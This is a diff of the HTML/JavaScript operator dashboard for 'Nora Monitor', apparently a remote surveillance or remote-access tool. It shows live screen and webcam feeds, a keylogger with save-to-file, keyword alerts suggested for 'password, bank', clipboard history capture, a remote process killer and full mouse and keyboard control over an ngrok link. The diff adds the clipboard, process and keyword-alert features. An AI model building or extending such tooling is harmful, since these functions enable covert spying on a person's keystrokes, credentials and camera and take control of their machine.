@@ -5,114 +5,119 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Nora Monitor</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #0d0d0d; color: #e0e0e0; font-family: 'Consolas', monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#0d0d0d; color:#e0e0e0; font-family:'Consolas',monospace; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
 
-  #ngrok-bar {
-    background: #0f1f0f;
-    border-bottom: 1px solid #1a3a1a;
-    padding: 5px 16px;
-    font-size: 12px;
-    display: none;
-    align-items: center;
-    gap: 10px;
-    flex-shrink: 0;
-  }
-  #ngrok-bar.visible { display: flex; }
-  #ngrok-bar span { color: #4ade80; }
-  #ngrok-url { color: #7c6aff; font-weight: bold; cursor: pointer; text-decoration: underline; }
-  #ngrok-copy { background: none; border: 1px solid #1a6640; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; font-family: inherit; }
-  #ngrok-copy:hover { background: #1a6640; }
+  #ngrok-bar { background:#0f1f0f; border-bottom:1px solid #1a3a1a; padding:5px 16px; font-size:12px; display:none; align-items:center; gap:10px; flex-shrink:0; }
+  #ngrok-bar.visible { display:flex; }
+  #ngrok-url { color:#7c6aff; font-weight:bold; cursor:pointer; text-decoration:underline; }
+  #ngrok-copy { background:none; border:1px solid #1a6640; color:#4ade80; padding:2px 8px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; }
+  #ngrok-copy:hover { background:#1a6640; }
 
-  #topbar {
-    background: #1a1a1a;
-    border-bottom: 1px solid #2a2a2a;
-    padding: 8px 16px;
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    flex-shrink: 0;
-  }
-  #topbar h1 { font-size: 14px; color: #7c6aff; letter-spacing: 2px; text-transform: uppercase; }
-  #status { font-size: 12px; padding: 3px 10px; border-radius: 12px; background: #2a2a2a; }
-  #status.connected { color: #4ade80; }
-  #status.disconnected { color: #f87171; }
-  #fps-info { font-size: 11px; color: #555; }
-  #rec-timer { font-size: 11px; color: #f87171; display: none; font-weight: bold; }
-  #rec-timer.visible { display: block; }
+  #topbar { background:#1a1a1a; border-bottom:1px solid #2a2a2a; padding:8px 16px; display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap; }
+  #topbar h1 { font-size:14px; color:#7c6aff; letter-spacing:2px; text-transform:uppercase; }
+  #status { font-size:12px; padding:3px 10px; border-radius:12px; background:#2a2a2a; }
+  #status.connected { color:#4ade80; }
+  #status.disconnected { color:#f87171; }
+  #fps-info { font-size:11px; color:#555; }
+  #rec-timer { font-size:11px; color:#f87171; font-weight:bold; display:none; }
+  #rec-timer.visible { display:block; }
+  #no-fsa-msg { font-size:11px; color:#f87171; display:none; }
 
-  .topbar-btn {
-    padding: 4px 14px; border-radius: 6px; border: none;
-    font-size: 12px; font-family: inherit; cursor: pointer;
-    letter-spacing: 1px; transition: background 0.2s, color 0.2s;
-  }
-  #rec-btn { margin-left: auto; background: #2a2a2a; color: #aaa; }
-  #rec-btn:hover:not(.recording) { background: #c0392b; color: #fff; }
-  #rec-btn.recording { background: #c0392b; color: #fff; animation: pulse 1.2s infinite; }
-  #cam-btn { background: #2a2a2a; color: #aaa; }
-  #cam-btn.active { background: #1a6640; color: #4ade80; }
-  #cam-btn:hover:not(.active) { background: #1a6640; color: #4ade80; }
-  #cam-btn.active:hover { background: #c0392b; color: #fff; }
+  .topbar-btn { padding:4px 14px; border-radius:6px; border:none; font-size:12px; font-family:inherit; cursor:pointer; letter-spacing:1px; transition:background .2s,color .2s; }
+  #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
+  #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
+  #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
+  #cam-btn { background:#2a2a2a; color:#aaa; }
+  #cam-btn.active { background:#1a6640; color:#4ade80; }
+  #cam-btn:hover:not(.active) { background:#1a6640; color:#4ade80; }
+  #cam-btn.active:hover { background:#c0392b; color:#fff; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
 
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
+  #main { display:flex; flex:1; overflow:hidden; }
+  #view-area { flex:1; display:flex; flex-direction:column; overflow:hidden; }
 
-  #main { display: flex; flex: 1; overflow: hidden; }
-  #view-area { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+  #screen-panel { flex:1; display:flex; align-items:center; justify-content:center; background:#080808; position:relative; overflow:hidden; }
+  #screen { max-width:100%; max-height:100%; object-fit:contain; cursor:none; display:block; user-select:none; }
+  #cursor { position:absolute; width:16px; height:16px; border:2px solid #7c6aff; border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; }
 
-  #screen-panel {
-    flex: 1; display: flex; align-items: center; justify-content: center;
-    background: #080808; position: relative; overflow: hidden;
-  }
-  #screen {
-    max-width: 100%; max-height: 100%; object-fit: contain;
-    cursor: none; display: block; user-select: none;
-  }
-  #cursor {
-    position: absolute; width: 16px; height: 16px;
-    border: 2px solid #7c6aff; border-radius: 50%;
-    pointer-events: none; transform: translate(-50%, -50%); display: none;
-  }
+  #camera-panel { height:200px; background:#050505; border-top:1px solid #222; display:none; align-items:center; justify-content:center; flex-shrink:0; }
+  #camera-panel.visible { display:flex; }
+  #camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
+  #cam-placeholder { color:#333; font-size:12px; }
 
-  #camera-panel {
-    height: 200px; background: #050505; border-top: 1px solid #222;
-    display: none; align-items: center; justify-content: center; flex-shrink: 0;
-  }
-  #camera-panel.visible { display: flex; }
-  #camera-feed { max-height: 100%; max-width: 100%; object-fit: contain; display: block; }
-  #cam-placeholder { color: #333; font-size: 12px; }
+  /* ── Sidebar ── */
+  #sidebar { width:320px; background:#111; border-left:1px solid #222; display:flex; flex-direction:column; flex-shrink:0; }
 
-  #sidebar { width: 300px; background: #111; border-left: 1px solid #222; display: flex; flex-direction: column; flex-shrink: 0; }
-  .panel-header {
-    background: #1a1a1a; padding: 8px 12px; font-size: 11px;
-    text-transform: uppercase; letter-spacing: 1px; color: #7c6aff;
-    border-bottom: 1px solid #2a2a2a; display: flex;
-    justify-content: space-between; align-items: center; flex-shrink: 0;
-  }
-  #keylog-panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-  #keylog { flex: 1; overflow-y: auto; padding: 10px; font-size: 12px; line-height: 1.7; word-break: break-all; color: #ccc; }
-  #keylog::-webkit-scrollbar { width: 4px; }
-  #keylog::-webkit-scrollbar-thumb { background: #333; }
-  .key-special { color: #7c6aff; font-weight: bold; }
-  .key-enter { display: block; border-top: 1px solid #222; margin: 4px 0; padding-top: 2px; }
+  .tab-bar { display:flex; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; }
+  .tab { flex:1; padding:8px 4px; font-size:11px; text-align:center; cursor:pointer; color:#555; letter-spacing:.5px; text-transform:uppercase; border-bottom:2px solid transparent; transition:color .2s; }
+  .tab.active { color:#7c6aff; border-bottom-color:#7c6aff; }
+  .tab:hover:not(.active) { color:#aaa; }
 
-  #clear-btn { background: none; border: 1px solid #333; color: #666; padding: 2px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; }
-  #clear-btn:hover { border-color: #7c6aff; color: #7c6aff; }
+  .tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
+  .tab-panel.active { display:flex; }
 
-  #control-panel { border-top: 1px solid #222; padding: 10px 12px; font-size: 11px; color: #666; flex-shrink: 0; }
-  #control-panel label { display: flex; align-items: center; gap: 8px; cursor: pointer; }
-  #control-panel input[type=checkbox] { accent-color: #7c6aff; }
-  .hotkey-hint { font-size: 10px; color: #444; margin-top: 6px; }
+  /* Keylog tab */
+  .panel-header { background:#1a1a1a; padding:7px 10px; font-size:10px; text-transform:uppercase; letter-spacing:1px; color:#7c6aff; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px; }
+  #keylog { flex:1; overflow-y:auto; padding:10px; font-size:12px; line-height:1.7; word-break:break-all; color:#ccc; }
+  #keylog::-webkit-scrollbar { width:4px; }
+  #keylog::-webkit-scrollbar-thumb { background:#333; }
+  .key-special { color:#7c6aff; font-weight:bold; }
+  .key-enter { display:block; border-top:1px solid #222; margin:4px 0; padding-top:2px; }
+  .hdr-btn { background:none; border:1px solid #333; color:#666; padding:2px 7px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; white-space:nowrap; }
+  .hdr-btn:hover { border-color:#7c6aff; color:#7c6aff; }
 
-  #no-fsa-msg { display:none; font-size:11px; color:#f87171; }
+  /* Keyword alerts */
+  #alert-section { border-top:1px solid #222; padding:8px 10px; flex-shrink:0; }
+  #alert-section label { font-size:10px; color:#555; text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; }
+  #alert-input-row { display:flex; gap:5px; }
+  #alert-input { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 7px; border-radius:4px; font-family:inherit; font-size:11px; }
+  #alert-add-btn { background:#2a2a2a; border:none; color:#aaa; padding:4px 9px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:11px; }
+  #alert-add-btn:hover { background:#7c6aff; color:#fff; }
+  #alert-tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:5px; }
+  .alert-tag { background:#1e1a3a; color:#7c6aff; font-size:10px; padding:2px 7px; border-radius:10px; cursor:pointer; }
+  .alert-tag:hover { background:#c0392b; color:#fff; }
+
+  /* Clipboard tab */
+  #clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:6px; }
+  #clipboard-list::-webkit-scrollbar { width:4px; }
+  #clipboard-list::-webkit-scrollbar-thumb { background:#333; }
+  .clip-item { background:#0d0d0d; border:1px solid #222; border-radius:5px; padding:7px 9px; font-size:11px; color:#ccc; word-break:break-all; position:relative; cursor:pointer; }
+  .clip-item:hover { border-color:#7c6aff; }
+  .clip-time { font-size:9px; color:#444; margin-bottom:3px; }
+  .clip-text { white-space:pre-wrap; max-height:80px; overflow:hidden; }
+
+  /* Process tab */
+  #proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid #222; flex-shrink:0; align-items:center; }
+  #proc-search { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
+  #proc-refresh { background:#2a2a2a; border:none; color:#aaa; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
+  #proc-refresh:hover { background:#7c6aff; color:#fff; }
+  #proc-list { flex:1; overflow-y:auto; font-size:11px; }
+  #proc-list::-webkit-scrollbar { width:4px; }
+  #proc-list::-webkit-scrollbar-thumb { background:#333; }
+  .proc-row { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; align-items:center; padding:5px 10px; border-bottom:1px solid #1a1a1a; }
+  .proc-row:hover { background:#151515; }
+  .proc-name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:#ddd; }
+  .proc-cpu { text-align:right; color:#f59e0b; font-size:10px; }
+  .proc-mem { text-align:right; color:#60a5fa; font-size:10px; }
+  .proc-kill { background:#3a1a1a; border:none; color:#f87171; padding:2px 5px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .proc-kill:hover { background:#c0392b; color:#fff; }
+  .proc-header { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; padding:5px 10px; font-size:10px; color:#444; border-bottom:1px solid #2a2a2a; text-transform:uppercase; flex-shrink:0; }
+
+  /* Control panel */
+  #control-panel { border-top:1px solid #222; padding:10px 12px; font-size:11px; color:#666; flex-shrink:0; }
+  #control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; }
+  #control-panel input[type=checkbox] { accent-color:#7c6aff; }
+  .hotkey-hint { font-size:10px; color:#444; margin-top:5px; }
 </style>
 </head>
 <body>
 
 <div id="ngrok-bar">
-  <span>🌐 Remote URL:</span>
+  <span style="color:#4ade80">🌐 Remote URL:</span>
   <span id="ngrok-url" onclick="copyNgrok()">waiting...</span>
   <button id="ngrok-copy" onclick="copyNgrok()">Copy</button>
-  <span style="font-size:10px;color:#2a5a2a;">← open this on your phone</span>
+  <span style="font-size:10px;color:#2a5a2a;">← open on your phone</span>
 </div>
 
 <div id="topbar">
@@ -128,7 +133,6 @@
 <div id="main">
   <div id="view-area">
     <div id="screen-panel">
-      <!-- Canvas used instead of img so we can capture a stream for recording -->
       <canvas id="screen"></canvas>
       <div id="cursor"></div>
     </div>
@@ -139,18 +143,54 @@
   </div>
 
   <div id="sidebar">
-    <div id="keylog-panel">
+    <!-- Tab bar -->
+    <div class="tab-bar">
+      <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
+      <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
+      <div class="tab" onclick="switchTab('processes')">Processes</div>
+    </div>
+
+    <!-- Keylog tab -->
+    <div id="tab-keylog" class="tab-panel active">
       <div class="panel-header">
         Keylog
-        <button id="clear-btn" onclick="clearLog()">clear</button>
+        <div style="display:flex;gap:5px;">
+          <button class="hdr-btn" onclick="saveLog()">Save .txt</button>
+          <button class="hdr-btn" onclick="clearLog()">Clear</button>
+        </div>
       </div>
       <div id="keylog"></div>
+      <div id="alert-section">
+        <label>Keyword Alerts (browser notification)</label>
+        <div id="alert-input-row">
+          <input id="alert-input" placeholder="e.g. password, bank..." onkeydown="if(event.key==='Enter')addAlert()">
+          <button id="alert-add-btn" onclick="addAlert()">Add</button>
+        </div>
+        <div id="alert-tags"></div>
+      </div>
     </div>
+
+    <!-- Clipboard tab -->
+    <div id="tab-clipboard" class="tab-panel">
+      <div class="panel-header">
+        Clipboard History
+        <button class="hdr-btn" onclick="clearClipboard()">Clear</button>
+      </div>
+      <div id="clipboard-list"><span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span></div>
+    </div>
+
+    <!-- Processes tab -->
+    <div id="tab-processes" class="tab-panel">
+      <div id="proc-controls">
+        <input id="proc-search" placeholder="Search process..." oninput="filterProcs()">
+        <button id="proc-refresh" onclick="loadProcs()">Refresh</button>
+      </div>
+      <div class="proc-header"><span>Name</span><span style="text-align:right">CPU%</span><span style="text-align:right">MB</span><span></span></div>
+      <div id="proc-list"></div>
+    </div>
+
     <div id="control-panel">
-      <label>
-        <input type="checkbox" id="ctrl-toggle" checked>
-        Remote control active
-      </label>
+      <label><input type="checkbox" id="ctrl-toggle" checked> Remote control active</label>
       <div class="hotkey-hint">Ctrl+Shift+D — toggle control</div>
     </div>
   </div>
@@ -179,8 +219,22 @@ const noFsaMsg   = document.getElementById("no-fsa-msg");
 const socket = io();
 let frameCount = 0, lastFpsTime = Date.now();
 let cameraActive = false;
+let allProcs = [];
+let alertKeywords = [];
+let keylogText = "";
 
-// ── Ngrok ────────────────────────────────────────────────────────────────────
+// ── Tabs ──────────────────────────────────────────────────────────────────────
+function switchTab(name) {
+  document.querySelectorAll(".tab").forEach((t,i) => {
+    const names = ["keylog","clipboard","processes"];
+    t.className = "tab" + (names[i] === name ? " active" : "");
+  });
+  document.querySelectorAll(".tab-panel").forEach(p => p.className = "tab-panel");
+  document.getElementById("tab-" + name).className = "tab-panel active";
+  if (name === "processes") loadProcs();
+}
+
+// ── Ngrok ─────────────────────────────────────────────────────────────────────
 function copyNgrok() {
   const url = ngrokUrlEl.textContent;
   if (url && url !== "waiting...") {
@@ -189,102 +243,186 @@ function copyNgrok() {
     setTimeout(() => document.getElementById("ngrok-copy").textContent = "Copy", 2000);
   }
 }
-socket.on("ngrok_url", (data) => { ngrokBar.className = "visible"; ngrokUrlEl.textContent = data.url; });
+socket.on("ngrok_url", d => { ngrokBar.className = "visible"; ngrokUrlEl.textContent = d.url; });
 
 // ── Connection ────────────────────────────────────────────────────────────────
 socket.on("connect",    () => { statusEl.textContent = "Connected";    statusEl.className = "connected"; });
 socket.on("disconnect", () => { statusEl.textContent = "Disconnected"; statusEl.className = "disconnected"; });
 
-// ── Screen stream → canvas ────────────────────────────────────────────────────
+// ── Screen ────────────────────────────────────────────────────────────────────
 const frameImg = new Image();
-frameImg.onload = () => {
-  canvas.width  = frameImg.naturalWidth;
-  canvas.height = frameImg.naturalHeight;
-  ctx.drawImage(frameImg, 0, 0);
-};
-
-socket.on("frame", (data) => {
-  frameImg.src = "data:image/jpeg;base64," + data.data;
+frameImg.onload = () => { canvas.width = frameImg.naturalWidth; canvas.height = frameImg.naturalHeight; ctx.drawImage(frameImg, 0, 0); };
+socket.on("frame", d => {
+  frameImg.src = "data:image/jpeg;base64," + d.data;
   frameCount++;
   const now = Date.now();
-  if (now - lastFpsTime >= 1000) {
-    fpsEl.textContent = frameCount + " fps";
-    frameCount = 0;
-    lastFpsTime = now;
-  }
+  if (now - lastFpsTime >= 1000) { fpsEl.textContent = frameCount + " fps"; frameCount = 0; lastFpsTime = now; }
 });
 
-// ── Browser-side recording (File System Access API) ───────────────────────────
-let mediaRecorder = null;
-let fileWriter    = null;
-let recSeconds    = 0;
-let recInterval   = null;
-const hasFSA = typeof window.showSaveFilePicker === "function";
+// ── Keylog ────────────────────────────────────────────────────────────────────
+socket.on("key", d => {
+  const char = d.char;
+  keylogText += char === "[ENTER]" ? "\n" : char.startsWith("[") && char.endsWith("]") ? char : char;
+  const span = document.createElement("span");
+  if (char === "[ENTER]") { span.className = "key-special key-enter"; span.textContent = char + "\n"; }
+  else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
+  else span.textContent = char;
+  keylogEl.appendChild(span);
+  keylogEl.scrollTop = keylogEl.scrollHeight;
+  checkAlerts(keylogText);
+});
 
+function clearLog() { keylogEl.innerHTML = ""; keylogText = ""; }
+
+function saveLog() {
+  const blob = new Blob([keylogText], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "keylog_" + new Date().toISOString().slice(0,19).replace(/[:.]/g,"-") + ".txt";
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+// ── Keyword Alerts ────────────────────────────────────────────────────────────
+function addAlert() {
+  const val = document.getElementById("alert-input").value.trim().toLowerCase();
+  if (!val || alertKeywords.includes(val)) return;
+  alertKeywords.push(val);
+  document.getElementById("alert-input").value = "";
+  renderAlertTags();
+  Notification.requestPermission();
+}
+
+function renderAlertTags() {
+  const el = document.getElementById("alert-tags");
+  el.innerHTML = alertKeywords.map(k =>
+    `<span class="alert-tag" onclick="removeAlert('${k}')" title="Click to remove">${k} ✕</span>`
+  ).join("");
+}
+
+function removeAlert(kw) {
+  alertKeywords = alertKeywords.filter(k => k !== kw);
+  renderAlertTags();
+}
+
+let _lastAlertAt = {};
+function checkAlerts(text) {
+  const lower = text.toLowerCase();
+  alertKeywords.forEach(kw => {
+    if (lower.includes(kw)) {
+      const now = Date.now();
+      if (!_lastAlertAt[kw] || now - _lastAlertAt[kw] > 10000) {
+        _lastAlertAt[kw] = now;
+        if (Notification.permission === "granted") {
+          new Notification("Nora Monitor — Keyword Detected", { body: `"${kw}" was typed`, icon: "" });
+        }
+      }
+    }
+  });
+}
+
+// ── Clipboard ─────────────────────────────────────────────────────────────────
+const clipList = document.getElementById("clipboard-list");
+let clipItems = [];
+
+socket.on("clipboard", d => {
+  clipItems.unshift({ text: d.text, time: new Date().toLocaleTimeString() });
+  if (clipItems.length > 100) clipItems.pop();
+  renderClipboard();
+});
+
+function renderClipboard() {
+  if (!clipItems.length) { clipList.innerHTML = '<span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span>'; return; }
+  clipList.innerHTML = clipItems.map((c, i) =>
+    `<div class="clip-item" onclick="copyClipItem(${i})">
+      <div class="clip-time">${c.time} — click to copy</div>
+      <div class="clip-text">${escHtml(c.text.slice(0, 300))}${c.text.length > 300 ? "…" : ""}</div>
+    </div>`
+  ).join("");
+}
+
+function copyClipItem(i) {
+  navigator.clipboard.writeText(clipItems[i].text);
+}
+
+function clearClipboard() { clipItems = []; renderClipboard(); }
+
+function escHtml(s) {
+  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+// ── Processes ─────────────────────────────────────────────────────────────────
+async function loadProcs() {
+  const r = await fetch("/processes");
+  allProcs = await r.json();
+  filterProcs();
+}
+
+function filterProcs() {
+  const q = document.getElementById("proc-search").value.toLowerCase();
+  const filtered = q ? allProcs.filter(p => p.name.toLowerCase().includes(q)) : allProcs;
+  document.getElementById("proc-list").innerHTML = filtered.map(p =>
+    `<div class="proc-row">
+      <span class="proc-name" title="${escHtml(p.name)}">${escHtml(p.name)}</span>
+      <span class="proc-cpu">${p.cpu}%</span>
+      <span class="proc-mem">${p.mem}MB</span>
+      <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>
+    </div>`
+  ).join("");
+}
+
+async function killProc(pid) {
+  if (!confirm(`Kill PID ${pid}?`)) return;
+  const r = await fetch("/processes/kill", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({pid}) });
+  const d = await r.json();
+  if (d.ok) loadProcs();
+}
+
+// ── Recording ─────────────────────────────────────────────────────────────────
+let mediaRecorder = null, fileWriter = null, recSeconds = 0, recInterval = null;
+const hasFSA = typeof window.showSaveFilePicker === "function";
 if (!hasFSA) noFsaMsg.style.display = "block";
 
 async function toggleRecord() {
   if (!hasFSA) return;
-  if (mediaRecorder && mediaRecorder.state === "recording") {
-    mediaRecorder.stop();
-    return;
-  }
+  if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); return; }
   try {
-    const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+    const ts = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
     const handle = await window.showSaveFilePicker({
       suggestedName: `nora_${ts}.webm`,
-      types: [{ description: "WebM Video", accept: { "video/webm": [".webm"] } }],
+      types: [{ description:"WebM Video", accept:{"video/webm":[".webm"]} }],
     });
     fileWriter = await handle.createWritable();
-
     const stream = canvas.captureStream(12);
-    const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
-      ? "video/webm;codecs=vp9"
-      : "video/webm";
-    mediaRecorder = new MediaRecorder(stream, { mimeType });
-
-    mediaRecorder.ondataavailable = async (e) => {
-      if (e.data && e.data.size > 0) await fileWriter.write(e.data);
-    };
-
+    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+    mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
+    mediaRecorder.ondataavailable = async e => { if (e.data?.size > 0) await fileWriter.write(e.data); };
     mediaRecorder.onstop = async () => {
-      await fileWriter.close();
-      fileWriter = null;
-      mediaRecorder = null;
-      recBtn.textContent = "⏺ REC";
-      recBtn.className = "topbar-btn";
-      recTimer.className = "";
-      clearInterval(recInterval);
-      recSeconds = 0;
+      await fileWriter.close(); fileWriter = null; mediaRecorder = null;
+      recBtn.textContent = "⏺ REC"; recBtn.className = "topbar-btn";
+      recTimer.className = ""; clearInterval(recInterval); recSeconds = 0;
     };
-
-    mediaRecorder.start(1000); // flush chunk to disk every second
-    recBtn.textContent = "⏹ STOP";
-    recBtn.className = "topbar-btn recording";
-    recSeconds = 0;
-    recTimer.className = "visible";
+    mediaRecorder.start(1000);
+    recBtn.textContent = "⏹ STOP"; recBtn.className = "topbar-btn recording";
+    recSeconds = 0; recTimer.className = "visible";
     recInterval = setInterval(() => {
       recSeconds++;
-      const h = String(Math.floor(recSeconds / 3600)).padStart(2,"0");
-      const m = String(Math.floor((recSeconds % 3600) / 60)).padStart(2,"0");
-      const s = String(recSeconds % 60).padStart(2,"0");
+      const h = String(Math.floor(recSeconds/3600)).padStart(2,"0");
+      const m = String(Math.floor((recSeconds%3600)/60)).padStart(2,"0");
+      const s = String(recSeconds%60).padStart(2,"0");
       recTimer.textContent = `● ${h}:${m}:${s}`;
     }, 1000);
-  } catch (e) {
-    // User cancelled file picker — do nothing
-  }
+  } catch(e) {}
 }
 
 // ── Camera ────────────────────────────────────────────────────────────────────
-socket.on("camera_frame", (data) => { if (cameraActive) camFeed.src = "data:image/jpeg;base64," + data.data; });
-socket.on("camera_state", (data) => updateCamUI(data.active));
-
+socket.on("camera_frame", d => { if (cameraActive) camFeed.src = "data:image/jpeg;base64," + d.data; });
+socket.on("camera_state", d => updateCamUI(d.active));
 async function toggleCamera() {
-  const r = await fetch(cameraActive ? "/camera/stop" : "/camera/start", { method: "POST" });
+  const r = await fetch(cameraActive ? "/camera/stop" : "/camera/start", { method:"POST" });
   const d = await r.json();
   if (!d.ok && !cameraActive) camPlaceholder.textContent = "No camera found";
 }
-
 function updateCamUI(active) {
   cameraActive = active;
   camBtn.textContent = active ? "📷 Camera ON" : "📷 Camera";
@@ -295,46 +433,28 @@ function updateCamUI(active) {
   else camPlaceholder.style.display = "none";
 }
 
-// ── Keylog ────────────────────────────────────────────────────────────────────
-socket.on("key", (data) => {
-  const char = data.char;
-  const span = document.createElement("span");
-  if (char === "[ENTER]") { span.className = "key-special key-enter"; span.textContent = char + "\n"; }
-  else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
-  else span.textContent = char;
-  keylogEl.appendChild(span);
-  keylogEl.scrollTop = keylogEl.scrollHeight;
-});
-function clearLog() { keylogEl.innerHTML = ""; }
-
 // ── Remote control ────────────────────────────────────────────────────────────
 function controlActive() { return ctrlToggle.checked; }
-
-screenPanel.addEventListener("mousemove", (e) => {
+screenPanel.addEventListener("mousemove", e => {
   const r = canvas.getBoundingClientRect();
   const x = e.clientX - r.left, y = e.clientY - r.top;
-  cursorEl.style.left = (x + r.left) + "px";
-  cursorEl.style.top  = (y + r.top)  + "px";
-  cursorEl.style.display = "block";
+  cursorEl.style.left = (x + r.left) + "px"; cursorEl.style.top = (y + r.top) + "px"; cursorEl.style.display = "block";
   if (!controlActive()) return;
-  socket.emit("command", { action: "mousemove", x: Math.max(0,x), y: Math.max(0,y), sw: r.width, sh: r.height });
+  socket.emit("command", { action:"mousemove", x:Math.max(0,x), y:Math.max(0,y), sw:r.width, sh:r.height });
 });
 screenPanel.addEventListener("mouseleave", () => { cursorEl.style.display = "none"; });
-screenPanel.addEventListener("mousedown",  (e) => { if (!controlActive()) return; socket.emit("command", { action: "mousedown", button: e.button }); });
-screenPanel.addEventListener("mouseup",    (e) => { if (!controlActive()) return; socket.emit("command", { action: "mouseup",   button: e.button }); });
-screenPanel.addEventListener("contextmenu",(e) => e.preventDefault());
-screenPanel.addEventListener("wheel",      (e) => { if (!controlActive()) return; socket.emit("command", { action: "scroll", delta: e.deltaY < 0 ? 3 : -3 }); });
-
-document.addEventListener("keydown", (e) => {
+screenPanel.addEventListener("mousedown",  e => { if (!controlActive()) return; socket.emit("command", { action:"mousedown", button:e.button }); });
+screenPanel.addEventListener("mouseup",    e => { if (!controlActive()) return; socket.emit("command", { action:"mouseup",   button:e.button }); });
+screenPanel.addEventListener("contextmenu",e => e.preventDefault());
+screenPanel.addEventListener("wheel",      e => { if (!controlActive()) return; socket.emit("command", { action:"scroll", delta:e.deltaY<0?3:-3 }); });
+document.addEventListener("keydown", e => {
   if (e.ctrlKey && e.shiftKey && e.key === "D") { ctrlToggle.checked = !ctrlToggle.checked; return; }
   if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault();
-  socket.emit("command", { action: "keydown", key: e.key });
+  e.preventDefault(); socket.emit("command", { action:"keydown", key:e.key });
 });
-document.addEventListener("keyup", (e) => {
+document.addEventListener("keyup", e => {
   if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault();
-  socket.emit("command", { action: "keyup", key: e.key });
+  e.preventDefault(); socket.emit("command", { action:"keyup", key:e.key });
 });
 </script>
 </body>
